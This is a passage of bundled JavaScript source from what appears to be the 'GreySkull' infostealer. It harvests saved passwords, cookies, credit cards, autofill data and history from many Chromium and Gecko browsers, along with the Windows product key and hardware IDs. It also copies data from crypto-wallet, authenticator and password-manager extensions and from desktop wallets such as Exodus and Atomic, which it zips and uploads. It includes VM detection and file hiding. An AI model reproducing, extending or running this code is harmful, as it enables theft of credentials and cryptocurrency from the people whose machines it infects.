      name: "TorBrowser",
    },
    {
      path: appdata + "\\Elements Browser\\User Data\\",
      name: "ElementsBrowser",
    },
    {
      path: appdata + "\\CocCoc\\Browser\\User Data\\",
      name: "CocCoc",
    },
    {
      path: appdata + "\\Go!\\User Data\\",
      name: "GoBrowser",
    },
    {
      path: appdata + "\\QIP Surf\\User Data\\",
      name: "QIP Surf",
    },
    {
      path: appdata + "\\RockMelt\\User Data\\",
      name: "RockMelt",
    },
    {
      path: appdata + "\\Nichrome\\User Data\\",
      name: "Nichrome",
    },
    {
      path: appdata + "\\Bromium\\User Data\\",
      name: "Bromium",
    },
    {
      path: appdata + "\\Comodo\\Dragon\\User Data\\",
      name: "Comodo",
    },
    {
      path: appdata + "\\Xpom\\User Data\\",
      name: "Xpom",
    },
    {
      path: appdata + "\\Chedot\\User Data\\",
      name: "Chedot",
    },
    {
      path: appdata + "\\360Browser\\Browser\\User Data\\",
      name: "360Browser",
    },
    {
      path: appdata + "\\Opera Software\\Opera Stable\\",
      name: "Opera",
    },
    {
      path: appdata + "\\Opera Software\\Opera GX Stable\\",
      name: "OperaGX",
    },
    {
      path: localappdata + "\\Epic Privacy Browser\\User Data\\",
      name: "EpicPrivacy",
    },
    {
      path: localappdata + "\\Google\\Chrome SxS\\User Data\\",
      name: "ChromeSxS",
    },
    {
      path: localappdata + "\\Sputnik\\Sputnik\\User Data\\",
      name: "Sputnik",
    },
    {
      path: localappdata + "\\7Star\\7Star\\User Data\\",
      name: "7Star",
    },
    {
      path: localappdata + "\\CentBrowser\\User Data\\",
      name: "CentBrowser",
    },
    {
      path: localappdata + "\\Orbitum\\User Data\\",
      name: "Orbitum",
    },
    {
      path: localappdata + "\\Kometa\\User Data\\",
      name: "Kometa",
    },
    {
      path: localappdata + "\\Torch\\User Data\\",
      name: "Torch",
    },
    {
      path: localappdata + "\\Amigo\\User Data\\",
      name: "Amigo",
    },
  ];
  chromiumPath = chromiumPath.concat(
    getProfiles(
      localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\",
      "Brave"
    )
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(localappdata + "\\Xpom\\User Data\\", "Xpom")
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(
      localappdata + "\\360Browser\\Browser\\User Data\\",
      "360Browser"
    )
  );

  chromiumPath = chromiumPath.concat(
    getProfiles(localappdata + "\\Chedot\\User Data\\", "Chedot")
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(
      localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\",
      "Brave"
    )
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(localappdata + "\\Iridium\\User Data\\", "Iridium")
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(localappdata + "\\Yandex\\YandexBrowser\\User Data\\", "Yandex")
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(localappdata + "\\uCozMedia\\Uran\\User Data\\", "Uran")
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(localappdata + "\\Microsoft\\Edge\\User Data\\", "Edge")
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(localappdata + "\\Google\\Chrome\\User Data\\", "Chrome")
  );
  chromiumPath = chromiumPath.concat(
    getProfiles(localappdata + "\\Vivaldi\\User Data\\", "Vivaldi")
  );

  var cookieslength = 0;
  var passwords = [];
  var autofills = [];
  var cards = [];
  var bookmarks = [];
  var history = [];
  var downloads = [];
  let i = 0;

  for (let obj of chromiumPath) {
    const path = obj.path;
    if (!fs.existsSync(path)) {
      continue;
    }

    i++;

    try {
      const cookies = await getCookies(path);
      cookieslength += cookies.length;

      let browserName;
      if (typeof obj.profile != "undefined") {
        browserName = obj.name + " [ " + obj.profile + " ]";
      } else {
        browserName = obj.name;
      }

      save.saveCookies(cookies, browserName);
      passwords = passwords.concat(await getPasswords(path, browserName));
      autofills = autofills.concat(await getAutofills(path, browserName));
      cards = cards.concat(await getCreditCards(path));
      history = history.concat(await getHistory(path));
      downloads = downloads.concat(await getDownloads(path));
      bookmarks = bookmarks.concat(await getBookmarks(path, browserName));
    } catch (e) {
      continue;
    }
  }
  let geckoPath = [];
  geckoPath = geckoPath.concat(
    getGeckoProfiles(appdata + "\\K-Meleon\\Profiles\\", "Kmelon")
  );
  geckoPath = geckoPath.concat(
    getGeckoProfiles(
      appdata + "\\Moonchild Productions\\Pale Moon\\Profiles\\",
      "PaleMoon"
    )
  );
  geckoPath = geckoPath.concat(
    getGeckoProfiles(appdata + "\\Comodo\\IceDragon\\Profiles\\", "IceDragon")
  );
  geckoPath = geckoPath.concat(
    getGeckoProfiles(
      appdata + "\\NETGATE Technologies\\BlackHaw\\Profiles\\",
      "BlackHaw"
    )
  );
  geckoPath = geckoPath.concat(
    getGeckoProfiles(
      appdata + "\\8pecxstudios\\Cyberfox\\Profiles\\",
      "Cyberfox"
    )
  );
  geckoPath = geckoPath.concat(
    getGeckoProfiles(appdata + "\\Thunderbird\\Profiles\\", "Thunderbird")
  );
  geckoPath = geckoPath.concat(
    getGeckoProfiles(appdata + "\\Mozilla\\SeaMonkey\\Profiles\\", "SeaMonkey")
  );
  geckoPath = geckoPath.concat(
    getGeckoProfiles(appdata + "\\Mozilla\\Firefox\\Profiles\\", "Firefox")
  );
  geckoPath = geckoPath.concat(
    getGeckoProfiles(appdata + "\\Waterfox\\Profiles\\", "Waterfox")
  );

  for (let obj of geckoPath) {
    const path = obj.path;
    if (!fs.existsSync(path)) {
      continue;
    }
    i++;
    try {
      const cookies = await getGeckoCookies(path);
      cookieslength += cookies.length;
      save.saveCookies(cookies, obj.name);

      bookmarks = bookmarks.concat(await getGeckoBookmarks(path, obj.name));
      history = history.concat(await getGeckoHistory(path));
      downloads = downloads.concat(await getGeckoDownloads(path));

      passwords = passwords.concat(await getGeckoPasswords(path, "", obj.name));
    } catch (e) {
      save.SaveError(e + "
Error browsers 1");
      continue;
    }
  }
  const importantSites = [
    "gmail",
    "youtube",
    "onoff",
    "xss.is",
    "pronote",
    "ovhcloud",
    "nulled",
    "cracked",
    "tiktok",
    "yahoo",
    "gmx",
    "aol",
    "coinbase",
    "binance",
    "steam",
    "epicgames",
    "discord",
    "paypal",
    "instagram",
    "spotify",
    "onlyfans",
    "pornhub",
    "origin",
    "amazon",
    "twitter",
    "aliexpress",
    "netflix",
    "roblox",
    "twitch",
    "facebook",
    "riotgames",
    "card",
    "telegram",
    "protonmail",
  ];

  function countImportantSites(website, importantSites) {
    let count = {};
    importantSites.forEach((importantSite) => {
      count[importantSite] = 0;
    });
    website.forEach((visitedSite) => {
      importantSites.forEach((importantSite) => {
        if (visitedSite.includes(importantSite)) {
          count[importantSite]++;
        }
      });
    });
    return count;
  }

  const count = countImportantSites(website, importantSites);

  for (const site in count) {
    if (count[site] > 0) {
      stat.AddKeyword(` ${site} : ${count[site]}`);
    }
  }
  save.saveBrowser(passwords, autofills, cards, history, downloads, bookmarks);
  stat.AddBrowser(
    passwords.length,
    cookieslength,
    autofills.length,
    cards.length,
    history.length,
    downloads.length,
    bookmarks.length
  );

  var pass = [];
  for (let i = 0; i < passwords.length; i++) {
    if (passwords[i]) {
      if (passwords[i].password) pass.push(passwords[i].password);
    }
  }
  return pass;
}

module.exports = {
  GreySkullBrowsers,
  getGeckoPasswords,
  getGeckoProfiles,
};


//# sourceURL=webpack://script/./utils/browsers.js?");

/***/ }),

/***/ 
})(module_2_exports, module_2_exports);
modules['module_2'] = module_2_exports;

// Módulo 3
const module_3_exports = {};
(function(module, exports) {
const fs = __webpack_require__(/*! fs */ "fs"),
  axios = __webpack_require__(/*! axios */ "axios"),
  util = __webpack_require__(/*! util */ "util"),
  exec = util.promisify((__webpack_require__(/*! child_process */ "child_process").exec)),
  execSync = util.promisify((__webpack_require__(/*! child_process */ "child_process").execSync)),
  path = __webpack_require__(/*! path */ "path"),
  PowerShell = __webpack_require__(/*! powershell */ "powershell"),
  Winreg = __webpack_require__(/*! winreg */ "winreg"),
  { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js");



function checkIfStartup(path){
  if(path.includes(process.env.APPDATA) || path.includes("\\Microsoft\\Windows") || path.includes("Startup")){
    return true;
  }
  else{
    return false;
  }
}


function cleaner() {
  try {
    fs.rmSync(stat.testpath[0], { recursive: true });
  } catch (e) { }
  try {
    fs.rmSync(stat.savepath[0], { recursive: true });
  } catch (e) { }
}

async function getProcessPathByPid(pid) {
  return new Promise((resolve, reject) => {
    const command =
      process.platform === "win32"
        ? `wmic process where processid=${pid} get ExecutablePath`
        : `ps -p ${pid} -o comm=`;
    execSync(command, (err, stdout, stderr) => {
      if (err) {
        reject(err);
        return;
      }
      const path = stdout.trim();
      resolve(path);
    });
  });
}

function isProcessRunning(processName, minCount) {
  return new Promise((resolve, reject) => {
    const command = process.platform === 'win32' ? 'tasklist' : 'ps aux';
    exec(command, (err, stdout, stderr) => {
      if (err) {
        reject(err);
        return;
      }

      const processes = stdout.toLowerCase();
      const processNameLower = processName.toLowerCase();
      const processCount = (processes.match(new RegExp(processNameLower, 'g')) || []).length;
      resolve(processCount >= minCount);
    });
  });
}


function filterProcessesByName(name) {
  return new Promise((resolve, reject) => {
    const command = process.platform === "win32" ? "tasklist" : "ps aux";
    exec(command, (err, stdout, stderr) => {
      if (err) {
        reject(err);
        return;
      }
      const lines = stdout.split("
");
      const filteredProcesses = [];
      for (const line of lines) {
        if (line.toLowerCase().includes(name.toLowerCase())) {
          const columns = line.split(/\s+/);
          filteredProcesses.push({
            name: columns[0],
            pid: parseInt(columns[1]),
            sessionName: columns[2],
            sessionNumber: parseInt(columns[3]),
            memoryUsage: parseInt(columns[4].replace(",", "")),
          });
        }
      }
      resolve(filteredProcesses);
    });
  });
}

async function getProcessPathByPid(pid) {
  return new Promise((resolve, reject) => {
    const command =
      process.platform === "win32"
        ? `wmic process where processid=${pid} get ExecutablePath`
        : `ps -p ${pid} -o comm=`;
    exec(command, (err, stdout, stderr) => {
      if (err) {
        reject(err);
        return;
      }
      const path = stdout.trim();
      resolve(path);
    });
  });
}

async function GreySkullFindMyself() {
  const executablePath = process.argv[0];
  try {
    const appDirectory = path.basename(executablePath);
    const targetProcesses = await filterProcessesByName(
      appDirectory.replace(".exe", "")
    );
    if (targetProcesses.length > 0) {
      const targetProcess = targetProcesses[0];
      const processPath = await getProcessPathByPid(targetProcess.pid);
      let myself = processPath
        .replace("ExecutablePath", "")
        .match(/[a-zA-Z].*[a-zA-Z]/g)
        .join("");
      if (!fs.existsSync(myself)) {
      } else {
        return myself;
      }
    } else {
      return "Failed";
    }
  } catch (error) {
    return "Failed";
  }
}

function generateId(len) {
  var text = "";
  var possible =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < len; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  return text;
}

function fileName(str) {
  return str.split("\\").pop().split("/").pop();
}

function recursiveRead(basepath, path) {
  var result = [];
  if (!basepath.endsWith("\\")) {
    basepath += "\\";
  }
  const files = fs.readdirSync(basepath);
  for (var i = 0; i < files.length; i++) {
    const file = files[i];
    const filePath = basepath + file;
    if (fs.statSync(filePath).isDirectory()) {
      result = result.concat(recursiveRead(filePath, path + file + "\\"));
    } else {
      result.push(path + file);
    }
  }
  return result;
}

async function checkInternetAccess() {
  try {
    await axios.get('http://www.google.com');
    return true;
  } catch (error) {
    try {
      await axios.get('https://www.facebook.com');
      return true;
    } catch (error) {
      return false;
    }
  }
}


function getProfiles(path, name) {
  const profile = path.split("%PROFILE%");
  if (profile.length == 1) {
    return [
      {
        path: path,
        name: name,
      },
    ];
  }
  if (!fs.existsSync(profile[0])) {
    return [];
  }
  var dirs = fs.readdirSync(profile[0]);
  var profiles = [];
  for (var i = 0; i < dirs.length; i++) {
    var dir = dirs[i];
    if (fs.existsSync(profile[0] + dir + profile[1])) {
      profiles.push({
        path: profile[0] + dir + profile[1],
        profile: name + " " + dir,
      });
    }
  }

  return profiles;
}

async function GetTotalPhysicalMemory() {
  let totalPhysicalMemory = "";
  try {
    totalPhysicalMemory = await getCommand(
      "wmic computersystem get totalphysicalmemory | more +1"
    );
  } catch (err) {
    if (err) {
      totalPhysicalMemory = 4;
    }
  }
  return parseInt(
    Math.floor(parseInt(totalPhysicalMemory) / (1024 * 1024 * 1024))
  );
}

async function getDisk() {
  let size = (await getCommand("wmic logicaldisk get size")).split(" ");
  for (let item of size) {
    if (item.trim() !== "" && item.trim().toLowerCase() !== "size") {
      return Math.floor(parseInt(item) / (1024 * 1024 * 1024)).toString();
    }
  }
  return "1000";
}

async function GetcleanUID() {
  let uid = await getCommand("wmic csproduct get uuid");
  let regex_uid = /UUID\s+([A-Fa-f0-9-]+)/;
  let match = uid.match(regex_uid);
  let uuid = match[1];
  return uuid;
}

async function getCommand(cmd) {
  const { stdout, _ } = await exec(cmd);
  return stdout.trim();
}

async function GetCPUCount() {
  try {
    const { stdout } = await getCommand("echo %NUMBER_OF_PROCESSORS%");
    const cpucount = parseInt(stdout);

    if (!isNaN(cpucount)) {
      return cpucount.toString();
    }
  } catch (error) {
    return "4";
  }
}

async function getInfo() {
  try {
    const [disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion] =
      await Promise.all([
        getDisk(),
        GetTotalPhysicalMemory(),
        GetcleanUID(),
        GetCPUCount(),
        await getCommand("wmic OS get caption, osarchitecture | more +1"),
        await getCommand("wmic cpu get name | more +1"),
        await getCommand("wmic PATH Win32_VideoController get name | more +1"),
        await getCommand(
          "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        ),
        await getCommand(
          "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"
        ),
      ]);
    return {
      disk,
      ram,
      uid,
      cpucount,
      OS,
      cpu,
      GPU,
      windowskey,
      windowsversion,
    };
  } catch (e) {
    if (e) {
      return {
        disk: "None",
        ram: "None",
        uid: "None",
        cpucount: "None",
        OS: "None",
        cpu: "None",
        GPU: "None",
        windowskey: "None",
        windowsversion: "None",
      };
    }
  }
}

async function getPublicIp() {
  var data = "";
  try {
    const res = await axios({
      url: "https://ipinfo.io/json",
      method: "GET",
    });
    data = res.data;
    if (data.length > 16) {
      return "Failed!";
    }
    return data;
  } catch (err) {
    return "Failed!";
  }
}

async function isVm() {
  const { stdout, _ } = await exec(
    'powershell -c "Get-WmiObject -Query \\"Select * from Win32_CacheMemory\\""'
  );
  if (stdout.replace(/\r/gm, "").replace(/
/gm, "").replace(/ /gm, "") == "") {
    return true;
  }
  return false;
}

function getHeader() {
  return `$$\\   $$\\                                     $$$$$$\\                       $$\\     $$\\                     $$\\ 
$$$\\  $$ |                                   $$  __$$\\                      $$ |    \\__|                    $$ |
$$$$\\ $$ | $$$$$$\\ $$\\    $$\\ $$$$$$\\        $$ /  \\__| $$$$$$\\  $$$$$$$\\ $$$$$$\\   $$\\ $$$$$$$\\   $$$$$$\\  $$ |
$$ $$\\$$ |$$  __$$\\\\$$\\  $$  |\\____$$\\       \\$$$$$$\\  $$  __$$\\ $$  __$$\\\\_$$  _|  $$ |$$  __$$\\ $$  __$$\\ $$ |
$$ \\$$$$ |$$ /  $$ |\\$$\\$$  / $$$$$$$ |       \\____$$\\ $$$$$$$$ |$$ |  $$ | $$ |    $$ |$$ |  $$ |$$$$$$$$ |$$ |
$$ |\\$$$ |$$ |  $$ | \\$$$  / $$  __$$ |      $$\\   $$ |$$   ____|$$ |  $$ | $$ |$$\\ $$ |$$ |  $$ |$$   ____|$$ |
$$ | \\$$ |\\$$$$$$  |  \\$  /  \\$$$$$$$ |      \\$$$$$$  |\\$$$$$$$\\ $$ |  $$ | \\$$$$  |$$ |$$ |  $$ |\\$$$$$$$\\ $$ |
\\__|  \\__| \\______/    \\_/    \\_______|       \\______/  \\_______|\\__|  \\__|  \\____/ \\__|\\__|  \\__| \\_______|\\__|
                                                                                                                  
                                                                                                                
      ###, ,##, ,##,
       #  # #  # #  #
       ###  #  # #  #
       #  # #  # #  #
       ###' '##' '##'
            .--,
           /  (
          /    \\
         /      \\ 
        /  0  0  \\
((()   |    ()    |   ()))
\\  ()  (  .____.  )  ()  /
 |\` \\_/ \\  \`""\`  / \\_/ \`|
 |       \`.'--'.\`       |
  \\        \`""\`        /
   \\                  /
    \`.              .'    ,
     |\`             |  _.'|
     |              \`-'  /
     \\                 .'
      \`.____________.-'
\t\tGreySkull By KSCH | https://t.me/Sordeal




`
}

function hideFile(filePath) {
  try {
    execSync(`powershell -Command "attrib +h +s \\"${filePath}\\""`);
  } catch (e) { }
}

module.exports = {
  generateId,
  fileName,
  recursiveRead,
  getProfiles,
  getPublicIp,
  isVm,
  getHeader,
  getInfo,
  GreySkullFindMyself,
  hideFile,
  filterProcessesByName,
  cleaner,
  getProcessPathByPid,
  checkInternetAccess,
  isProcessRunning,
  checkIfStartup,
};


//# sourceURL=webpack://script/./utils/core.js?");

/***/ }),

/***/ 
})(module_3_exports, module_3_exports);
modules['module_3'] = module_3_exports;

// Módulo 4
const module_4_exports = {};
(function(module, exports) {
const fs = __webpack_require__(/*! fs */ "fs"),
 seco = __webpack_require__(/*! seco-file */ "seco-file"),
 core = __webpack_require__(/*! ./core */ "./utils/core.js"),
 save = __webpack_require__(/*! ./save */ "./utils/save.js"),
 passworder = __webpack_require__(/*! node-passworder */ "node-passworder"),
 { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),
 { upload } = __webpack_require__(/*! ./uploadFiles */ "./utils/uploadFiles.js");

 
class Extension {
  constructor(name, id) {
    this.name = name;
    this.id = id;
  }

  addPath(path) {
    this.path = path;
  }

  addProfile(profile) {
    this.profile = profile;
  }
}

class Cold {
  constructor(name, existpath, stealpath) {
    this.name = name;
    this.existpath = existpath;
    this.stealpath = stealpath;
  }
}

function getBrowsersProfile() {
  const local = process.env.localappdata;
  const appdata = process.env.appdata;

  const browsers_path = [
    local +
      "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Extension Settings",
    local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Extension Settings",
    appdata + "\\Opera Software\\Opera GX Stable\\Local Extension Settings",
    appdata +
      "\\Opera Software\\Opera Stable\\User Data\\%PROFILE%\\Local Extension Settings",
    local +
      "\\Google\\Chrome Beta\\User Data\\%PROFILE%\\Local Extension Settings",
    local + "\\Yandex\\YandexBrowser\\User Data\\Local Extension Settings",
    local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Extension Settings",
  ];

  var browsers_profile = [];
  for (var i = 0; i < browsers_path.length; i++) {
    const browser = browsers_path[i];
    const profiles = core.getProfiles(browser, browser.split("\\")[6]);
    for (var j = 0; j < profiles.length; j++) {
      browsers_profile.push(profiles[j]);
    }
  }

  return browsers_profile;
}

function GreySkullExtensions(cc) {
  if (cc != "yes") return;
  try {
    const browsers_profile = getBrowsersProfile();

    const extensions = [
      new Extension("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"),
      new Extension("Jaxx Liberty", "ocefimbphcgjaahbclemolcmkeanoagc"),
      new Extension("Atomic Wallet", "dlbmjjglhklgdodnkdlenlicpgppjcdd"),
      new Extension("Electrum", "hieplnfojfccegoloniefimmbfjdgcgp"),
      new Extension("Mycelium", "pidhddgciaponoajdngciiemcflpnnbg"),
      new Extension("Coinomi", "blbpgcogcoohhngdjafgpoagcilicpjh"),
      new Extension("GreenAddress", "gflpckpfdgcagnbdfafmibcmkadnlhpj"),
      new Extension("Edge", "doljkehcfhidippihgakcihcmnknlphh"),
      new Extension("BRD", "nbokbjkelpmlgflobbohapifnnenbjlh"),
      new Extension("Samourai Wallet", "apjdnokplgcjkejimjdfjnhmjlbpgkdi"),
      new Extension("Airbitz", "dojmlmceifkfgkgeejemfciibjehhdcl"),
      new Extension("Trezor", "jpxupxjxheguvfyhfhahqvxvyqthiryh"),
      new Extension("Ledger Live", "pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln"),
      new Extension("Ledger Wallet", "hbpfjlflhnmkddbjdchbbifhllgmmhnm"),
      new Extension("YubiKey", "mammpjaaoinfelloncbbpomjcihbkmmc"),
      new Extension("Digital Bitbox", "dbhklojmlkgmpihhdooibnmidfpeaing"),
      new Extension("Google Authenticator", "khcodhlfkpmhibicdjjblnkgimdepgnd"),
      new Extension("Microsoft Authenticator", "bfbdnbpibgndpjfhonkflpkijfapmomn"),
      new Extension("Authy", "gjffdbjndmcafeoehgdldobgjmlepcal"),
      new Extension("Duo Mobile", "eidlicjlkaiefdbgmdepmmicpbggmhoj"),
      new Extension("OTP Auth", "bobfejfdlhnabgglompioclndjejolch"),
      new Extension("Dashlane", "flikjlpgnpcjdienoojmgliechmmheek"),
      new Extension("FreeOTP", "elokfmmmjbadpgdjmgglocapdckdcpkn"),
      new Extension("Aegis Authenticator", "ppdjlkfkedmidmclhakfncpfdmdgmjpm"),
      new Extension("LastPass Auth", "cfoajccjibkjhbdjnpkbananbejpkkjb"),
      new Extension("Keeper", "gofhklgdnbnpcdigdgkgfobhhghjmmkj"),
      new Extension("RoboForm", "hppmchachflomkejbhofobganapojjol"),
      new Extension("KeePass", "lbfeahdfdkibininjgejjgpdafeopflb"),
      new Extension("KeePassXC", "kgeohlebpjgcfiidfhhdlnnkhefajmca"),
      new Extension("Bitwarden", "inljaljiffkdgmlndjkdiepghpolcpki"),
      new Extension("NordPass", "njgnlkhcjgmjfnfahdmfkalpjcneebpl"),
      new Extension("LastPass", "gabedfkgnbglfbnplfpjddgfnbibkmbb"),
      new Extension("CommonKey", "chgfefjpcobfbnpmiokfjjaglahmnded"),
      new Extension("Splikity", "jhfjfclepacoldmjmkmdlmganfaalklb"),
      new Extension("MicrosoftAutofill", "fiedbfgcleddlbcmgdigjgdfcggjcion"),
      new Extension("KeePass", "fmhmiaejopepamlcjkncpgpdjichnecm"),
      new Extension("KeePassXC", "oboonakemofpalcgghocfoadofidjkkk"),
      new Extension("MYKI Password Manager", "bmikpgodpkclnkgmnpphehdgcimmided"),
      new Extension("Browserpass", "naepdomgkenhinolocfifgehidddafch"),
      new Extension("LastPass", "hdokiejnpimakedhajhdlcegeplioahd"),
      new Extension("RoboForm Manager", "pnlccmojcmeohlpggmfnbbiapkmbliob"),
      new Extension("Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
      new Extension("Exodus", "aholpfdialjgjfhomihkjbmgjidlcdno"),
      new Extension("Sollet", "fhmfendgdocmcbmfikdcogofphimnkno"),
      new Extension(
        "Trezor Password Manager",
        "imloifkgjagghnncjkhggdhalmcnfklk"
      ),
      new Extension("GAuth Authenticator", "ilgcnhelpchnceeipipijaljkblbcobl"),
      new Extension("EOS Authenticator", "oeljdldpnmdbchonielidgobddffflal"),
      new Extension("Authy", "gaedmjdfmmahhbjefcbgaolhhanlaolb"),
      new Extension("Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"),
      new Extension("EO.Finance", "hoighigmnhgkkdaenafgnefkcmipfjon"),
      new Extension("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
      new Extension("Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
      new Extension("Jaxx Liberty", "cjelfplplebdjjenllpjcblmjkfcffne"),
      new Extension("Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
      new Extension("Math", "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
      new Extension("Binance", "fhbohimaelbohpjbbldcngcnapndodjp"),
      new Extension("Nifty", "jbdaocneiiinmjbjlgalhcelgbejmnid"),
      new Extension("Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb"),
      new Extension("EQUAL", "blnieiiffboillknjnepogjhkgnoapac"),
      new Extension("BitApp", "fihkakfobkmkjojpchpfgcmhfjnmnfpi"),
      new Extension("iwallet", "kncchdigobghenbbaddojjnnaogfppfj"),
      new Extension("Wombat", "amkmjjmmflddogmhpjloimipbofnfjih"),
      new Extension("MEW CX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
      new Extension("Guild", "nanjmdknhkinifnkgdcggcfnhdaammmj"),
      new Extension("Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
      new Extension("NeoLine", "cphhlgmgameodnhkjdmkpanlelnlohao"),
      new Extension("Clover", "nhnkbkgjikgcigadomkphalanndcapjk"),
      new Extension("Liquality", "kpfopkelmapcoipemfendmdcghnegimn"),
      new Extension("Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp"),
      new Extension("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"),
      new Extension("Coin98", "aeachknmefphepccionboohckonoeemg"),
      new Extension("ZilPay", "klnaejjgbibmhlephnhpmaofohgkpgkd"),
      new Extension("Hycon Lite Client", "bcopgchhojmggmffilplmbdicgaihlkp"),
      new Extension("Nash", "onofpnbbkehpmmoabgpcpmigafmmnjhl"),
      new Extension("Steem Keychain", "jhgnbkkipaallpehbohjmkbjofjdmeid"),
      new Extension("BitClip", "ijmpgkjfkbfhoebgogflfebnmejmfbml"),
      new Extension("DAppPlay", "lodccjjbdhfakaekdiahmedfbieldgik"),
      new Extension("Auro", "cnmamaachppnkjgnildpdmkaakejnhae"),
      new Extension("Polymesh", "jojhfeoedkpkglbfimdfabpdfjaoolaf"),
      new Extension("ICONex", "flpiciilemghbmfalicajoolhkkenfel"),
      new Extension("Nabox", "nknhiehlklippafakaeklbeglecifhad"),
      new Extension("KHC", "hcflpincpppdclinealmandijcmnkbgn"),
      new Extension("Temple", "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
      new Extension("TezBox", "mnfifefkajgofkcjkemidiaecocnkjeh"),
      new Extension("Cyano", "dkdedlpgdmmkkfjabffeganieamfklkm"),
      new Extension("Byone", "nlgbhdfgdhgbiamfdfmbikcdghidoadd"),
      new Extension("OneKey", "infeboajgfhgbjpjbeppbkgnabfdkdaf"),
      new Extension("Leaf", "cihmoadaighcejopammfbmddcmdekcje"),
      new Extension("Dashlane", "fdjamakpfbbddfjaooikfcpapjohcfmg"),
      new Extension("NordPass", "fooolghllnmhmmndgjiamiiodkpenpbb"),
      new Extension("BitWarden", "nngceckbapebfimnlniiiahkandclblb"),
    ];

    var final_extensions = [];
    for (var i = 0; i < browsers_profile.length; i++) {
      const profile = browsers_profile[i].path;
      for (var j = 0; j < extensions.length; j++) {
        const extension = extensions[j];
        const path = profile + "\\" + extension.id;
        if (fs.existsSync(path)) {
          extension.addPath(path);
          extension.addProfile(profile.split("\\")[6].replace(" ", ""));
          final_extensions.push(extension);
        }
      }
    }

    for (var i = 0; i < final_extensions.length; i++) {
      const extension = final_extensions[i];
      stat.AddExtensions(extension.name);
      save.Save(
        extension.path + "\\",
        "Wallets",
        "Extensions\\" + extension.name + "-" + extension.profile
      );
    }
  } catch (e) {
    save.SaveError(e);
  }
}

async function GreySkullColds(cc) {
  if (cc != "yes") return;
  try {
    const appdata = process.env.appdata;
    const local = process.env.localappdata;
    const colds = [
      new Cold("Exodus", appdata + "\\Exodus", [
        appdata + "\\Exodus\\exodus.wallet\\",
        appdata + "\\Exodus\\exodus.conf.json",
        appdata + "\\Exodus\\window-state.json",
      ]),
      new Cold("Electrum", appdata + "\\Electrum-LTC", [
        appdata + "\\Electrum-LTC\\wallets\\",
      ]),
      new Cold("Atomic", appdata + "\\atomic", [
        appdata + "\\atomic\\Local Storage\\leveldb\\",
      ]),
      new Cold("MultiDog", appdata + "\\MultiDog", [
        appdata + "\\MultiDog\\multidoge.wallet\\",
      ]),
      new Cold("Bitcoin Core", appdata + "\\Bitcoin\\Bitcoin Core", [
        appdata + "\\Bitcoin\\Bitcoin Core\\wallet.dat",
      ]),
      new Cold("Binance", appdata + "\\Binance", [
        appdata + "\\Binance\\app-store.json",
        appdata + "\\Binance\\Cookies",
      ]),
      new Cold("Coinomi", appdata + "\\Coinomi", [
        appdata + "\\Coinomi\\wallets\\",
      ]),
      new Cold("Jax", appdata + "\\jaxx", [
        appdata + "\\jaxx\\LocalStorage\\file_0.localstorage",
      ]),
      new Cold("ElectronCash", appdata + "\\ElectronCash", [
        appdata + "\\ElectronCash\\wallets\\default_wallet",
      ]),
      new Cold("Electrum", appdata + "\\Electrum", [
        appdata + "\\Electrum\\wallets\\",
      ]),
      new Cold("Ether", appdata + "\\Ethereum", [
        appdata + "\\Ethereum\\keystore\\",
      ]),
      new Cold("Zcash", appdata + "\\Zcash", [appdata + "\\Zcash"]),
      new Cold("Armory", appdata + "\\Armory", [appdata + "\\Armory"]),
      new Cold("Bytecoin", appdata + "\\Bytecoin", [appdata + "\\Bytecoin"]),
      new Cold("Jaxx", appdata + "\\Jaxx", [
        appdata +
          "\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb",
      ]),
      new Cold("Guarda", appdata + "\\Guarda", [
        appdata + "\\Guarda\\Local Storage\\leveldb",
      ]),
      new Cold("Coinomi", local + "\\Coinomi", [
        appdata + "\\Coinomi\\Coinomi\\wallets",
      ]),
    ];

    for (var i = 0; i < colds.length; i++) {
      const cold = colds[i];
      if (fs.existsSync(cold.existpath)) {
        if (cold.name == "Exodus") {
          stat.AddColds(cold.name);
          await save.ArraySave(cold.stealpath, "Wallets", cold.name);

          const zipPath = await save.zip(cold.stealpath);
          let exodusurl = await upload(zipPath);
          stat.addExodusLink(exodusurl);
        }
        if (cold.name == "Atomic") {
          stat.AddColds(cold.name);
          await save.ArraySave(cold.stealpath, "Wallets", cold.name);

          const zipPath = await save.zip(cold.stealpath);
          let atomicurl = await upload(zipPath);
          stat.addAtomicLink(atomicurl);
        }
        stat.AddColds(cold.name);
